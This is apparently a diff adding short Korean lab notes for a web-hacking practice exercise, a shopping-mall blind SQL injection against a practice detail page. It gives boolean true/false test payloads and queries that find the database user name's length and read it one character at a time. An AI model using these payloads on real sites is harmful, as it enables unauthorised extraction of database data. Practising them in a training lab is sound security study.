@@ -1,0 +1,26 @@
+* 쇼핑몰 문제 1번
+
+-공격 포인트 확인
+
+공격구문 작성 
+
+62 and 1 = 1 and (__공격쿼리__)
+
+1. 공격한 URL
+/practice/practice01/detail?id=62+and+1+%3d+1
+
+
+
+2. 공격 포인트 확인
+
+참: 62 and 1 = 1
+
+거짓: 62 and 1 = 2
+
+3. 유저명 글자 수 확인
+
+(select length(user) from dual) > 0
+
+3. 유저명 글자 한글자씩 확인
+
+62 and (select ascii(substr(user,1,1)) from dual) = 75
